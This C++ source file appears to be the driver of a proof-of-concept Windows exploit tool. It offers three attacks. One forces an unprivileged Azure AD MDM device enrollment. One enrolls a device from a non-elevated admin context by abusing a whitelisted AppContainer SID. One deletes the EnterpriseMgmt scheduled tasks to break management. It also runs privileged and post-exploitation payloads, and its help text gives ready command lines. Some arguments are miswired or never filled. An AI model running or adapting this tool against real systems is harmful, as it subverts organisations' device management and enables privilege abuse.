#include "common.h"

// It performs an MDM Device Enrollment using the AAD flow
int ReflectedAADEnrollment(
  bool is_enroll_only_mdm_requested,
  const std::wstring& enroll_upn,
  const std::wstring& enroll_mdm_webservice) {

  int ret = EXIT_FAILURE;

  // Checking if running from a privileged token
  if (IsAdminToken()) {

    // Executing privileged payload
    if (ExecutePrivilegedCmdPayload()) {
      ret = EXIT_SUCCESS;
    }
  }
  else {

    // Checking required arguments
    if (enroll_mdm_webservice.empty()) {
      wprintf(L"[-] Invalid arguments were provided: --enroll-webservice should be used\n");
      return ret;
    }

    wprintf(L"[+] About to run the AAD MDM Device Enrollment exploit\n");

    wprintf(L"[+] Performing device enrollment using ReflectedEnroller service (This will take some time)\n");

    //Perform the actual MDM enrollment
    if (EnrollAADUsingReflectedEnroller(enroll_upn, enroll_mdm_webservice) != S_OK) {
      wprintf(L"[-] There was a problem performing the device enrollment\n");
      return ret;
    }

    wprintf(L"[+] AAD MDM Enrollment was successful!\n");

    wprintf(L"[+] Executing post-exploitation actions\n");
    if (!ExecutePostExploitationPayload(is_enroll_only_mdm_requested, exploit_aad_mdm_enrollment)) {
      wprintf(L"[-] There was a problem performing the device enrollment\n");
      return ret;
    }
  }

  return EXIT_SUCCESS;
}

// It deletes all the sched tasks realted to MDM enrollments
int EnrollmentSchedTasksDelete() {
  int ret = EXIT_FAILURE;

  wprintf(L"[+] About to run SchedTask delete exploit\n");

  // Get the list of enrollment tasks
  TStrings enrollment_sched_tasks;
  if (GetListOfEnrollmentTasks(enrollment_sched_tasks) && !enrollment_sched_tasks.empty()) {

    wprintf(L"[+] %d sched taks were going to be deleted.\n", (unsigned int)enrollment_sched_tasks.size());

    //Grabbing list of sched tasks
    unsigned int deleted_tasks = 0;
    for (auto task_path : enrollment_sched_tasks) {
      wprintf(L"[+] About to delete sched task (%s)\n", task_path.c_str());

      if (DeleteEnrollmentTask(task_path) == S_OK) {
        wprintf(L"[+] Sched task %s was successfully deleted\n", task_path.c_str());
        deleted_tasks++;
        ret = EXIT_SUCCESS;
      }
      else {
        wprintf(L"[-] There was a problem deleting sched task %s\n", task_path.c_str());
      }
    }

    wprintf(L"[+] Sched tasks present at \"\\\\Microsoft\\Windows\\EnterpriseMgmt\" were successfully deleted\n");
  }
  else {
    wprintf(L"[-] No MDM enrollments were done on this device\n");
  }

  return ret;
}

// It performs an MDM Device Enrollment from non-elevated local admin context
int WhitelistedMDMEnrollment(
  bool is_enroll_only_mdm_requested,
  bool is_unenroll_requested,
  const std::wstring& enroll_upn,
  const std::wstring& enroll_mdm_webservice) {

  int ret = EXIT_FAILURE;

  // Checking if running from an appcontainer process
  if (IsAppContainer()) {

    if (is_unenroll_requested) {
      if (UnenrollFromMDM()) {
        ret = EXIT_SUCCESS;
      }
    }
    else {
      if (EnrollIntoMDM(enroll_mdm_webservice, enroll_mdm_webservice)) {
        ret = EXIT_SUCCESS;
      }
    }
  }

  // Checking if running from a privileged token
  else if (IsAdminToken()) {

    // Executing privileged payload
    if (ExecutePrivilegedCmdPayload()) {
      ret = EXIT_SUCCESS;
    }
  }

  // Otherwise run the main exploit logic
  else {

    // checking if primary token has BUILTIN\Administrators on its list of groups
    if (!IsAdminPresentToken()) {
      wprintf(L"[-] Caller user should be part of local administrators\n");
      return ret;
    }

    //checking required arguments
    if (enroll_mdm_webservice.empty()) {
      wprintf(L"[-] Invalid arguments were provided: --enroll-webservice should be used\n");
      return ret;
    }

    wprintf(L"[+] About to run the MDM Device Enrollment exploit\n");

    wprintf(L"[+] Performing device enrollment using whitelisted AppContainer SID (This will take some time)\n");
    if (!PerformDeviceEnrollmentUsingWhitelistedProcess(enroll_mdm_webservice, enroll_upn)) {
      wprintf(L"[-] There was a problem performing the device enrollment\n");
      return ret;
    }

    wprintf(L"[+] MDM Enrollment was successful!\n");

    wprintf(L"[+] Executing Post Exploitation actions\n");
    if (!ExecutePostExploitationPayload(is_enroll_only_mdm_requested, exploit_whitelisted_mdm_enrollment)) {
      wprintf(L"[-] There was a problem performing the device enrollment\n");
      return ret;
    }

    ret = EXIT_SUCCESS;
  }

  return ret;
}

void ShowHelp() {
  wprintf(L"MDM Enrollment Client PoCs\n");
  wprintf(L"Usage: ");
  wprintf(L"mdm_enrollment_client_pocs.exe");
  wprintf(L" --exploit <target_exploit>");
  wprintf(L" --enroll-webservice <enroll_webservice_url>\n");
  wprintf(L"Supported Exploits: \n");
  wprintf(L" exploit_aad_mdm_enrollment (Unprivileged MDM Device enrollment)\n");
  wprintf(L" whitelisted_mdm_enrollment (Non-elevated local admin MDM Device enrollment\n");
  wprintf(L" exploit_sched_tasks_delete (MDM Enrollment break throuh MDM Schedtasks deletion\n");
  wprintf(L"Usage Examples: \n");
  wprintf(L" mdm_enrollment_client_pocs.exe --exploit aad_mdm_enrollment --enroll-webservice https://mdm.email.com/enroll\n");
  wprintf(L" mdm_enrollment_client_pocs.exe --exploit whitelisted_mdm_enrollment --enroll-webservice https://mdm.email.com/enroll\n");
  wprintf(L" mdm_enrollment_client_pocs.exe --exploit mdm_sched_tasks\n");
}


int wmain() {
  int ret = EXIT_FAILURE;

  //Command line arguments parsing
  bool is_enroll_only_mdm_requested = false;
  bool unenrollment_present = false;
  std::wstring target_exploit;
  std::wstring enroll_webservice;
  std::wstring enroll_upn;

  // Parsing command line arguments
  if (!GetParsedArguments(is_enroll_only_mdm_requested, unenrollment_present, target_exploit, enroll_webservice)) {
    ShowHelp();
    return ret;
  }

  //AAD MDM Enrollment exploit
  if (target_exploit.compare(exploit_aad_mdm_enrollment) == 0) {
    ret = ReflectedAADEnrollment(is_enroll_only_mdm_requested, enroll_upn, enroll_webservice);
  }

  //Whitelisted MDM Enrollment
  else if (target_exploit.compare(exploit_whitelisted_mdm_enrollment) == 0) {
    ret = WhitelistedMDMEnrollment(is_enroll_only_mdm_requested, unenrollment_present, enroll_upn, enroll_webservice);
  }

  //MDM Scheduled Tasks Delete
  else if (target_exploit.compare(exploit_sched_tasks_delete) == 0) {
    ret = EnrollmentSchedTasksDelete();
  }

  else {
    wprintf(L"[-] Target exploit is not supported!\n");
    ShowHelp();
  }

  return ret;
}
